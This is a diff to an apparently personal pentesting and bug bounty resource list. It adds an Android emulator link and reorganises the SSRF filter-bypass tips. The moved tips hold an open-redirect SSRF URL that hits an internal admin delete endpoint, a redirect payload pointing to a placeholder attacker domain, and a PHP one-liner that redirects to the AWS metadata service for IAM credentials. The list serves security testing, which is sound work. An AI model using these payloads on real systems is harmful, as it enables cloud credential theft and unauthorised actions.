@@ -154,6 +154,7 @@ Here I gather all the resources about PenTesting and Bug Bounty Hunting that I f
 - [apktool](https://ibotpeaches.github.io/Apktool/) to unpack an apk
 - [adb](https://developer.android.com/studio/command-line/adb) it is used to debug an android device
 - [HTTP Toolkit](https://httptoolkit.tech/) to see requests on a non-rooted or emulated device, as an alternative to burp suite
+- [Genymotion](https://www.genymotion.com/) an android emulator
 - [Android Studio](https://developer.android.com/studio) Android application development, useful for the emulator
   - Note: to start onlythe emulator, use commands such as
     ```
@@ -358,17 +359,17 @@ SRF with whitelist-based input filters bypass
 - You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request.
 - You can use combinations of these techniques together.
 
-By combining it with an open redirect, you can bypass some restrictions. [An example](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection): `http://vulnerable.com/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos`
+Other tips
+- By combining it with an open redirect, you can bypass some restrictions. [An example](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection): `http://vulnerable.com/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos`
+- Open Redirect Bypass:
+  - https://subdomain.victim.com/r/redir?url=https%3A%2F%2Fvictim.com%40ATTACKER_WEBSITE.COM?x=subdomain.victim.com%2f
+- For AWS, bypass some restrictions by hosting this PHP page ([Reference](https://hackerone.com/reports/508459)):
+  ```PHP
+  <?php header('Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-opsworks-ec2-role', TRUE, 303); ?>
+  ```
+- If everything fails, look for assets pointing to internal IPs. You can usually find these via CSP headers, JS files, Github, shodan/censys etc. [[Reference](https://twitter.com/bogdantcaciuc7/status/1561572514295341058)]
 
-Open Redirect Bypass:
-- https://subdomain.victim.com/r/redir?url=https%3A%2F%2Fvictim.com%40ATTACKER_WEBSITE.COM?x=subdomain.victim.com%2f
-
-For AWS, bypass some restrictions by hosting this PHP page ([Reference](https://hackerone.com/reports/508459)):
-```PHP
-<?php header('Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-opsworks-ec2-role', TRUE, 303); ?>
-```
-
-Burp extensions:
+Burp extensions
 - [Collaborator Everywhere](https://portswigger.net/bappstore/2495f6fb364d48c3b6c984e226c02968)
 
 ### Authentication vulnerabilities
